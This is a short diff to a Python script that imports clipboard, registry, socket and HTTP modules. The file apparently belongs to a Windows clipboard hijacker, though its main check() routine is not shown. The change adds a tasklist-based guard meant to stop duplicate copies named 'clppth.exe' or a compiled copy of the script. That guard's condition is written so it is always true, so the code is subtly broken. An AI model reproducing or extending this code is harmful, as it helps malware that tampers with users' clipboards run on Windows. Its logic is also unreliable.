@@ -1,4 +1,5 @@
 import http.client
+import subprocess
 import pyperclip
 import socket
 import winreg
@@ -354,4 +355,12 @@ def check():
         pass
     
 if __name__ == "__main__":
-    check()
+    try:
+        if os.name == "nt":
+            proc = str(subprocess.check_output('tasklist').decode())
+            if "clppth.exe" or os.path.basename(__file__).replace(".py", ".exe") not in proc:  
+                check()
+            else:
+                sys.exit()
+    except Exception:
+        pass
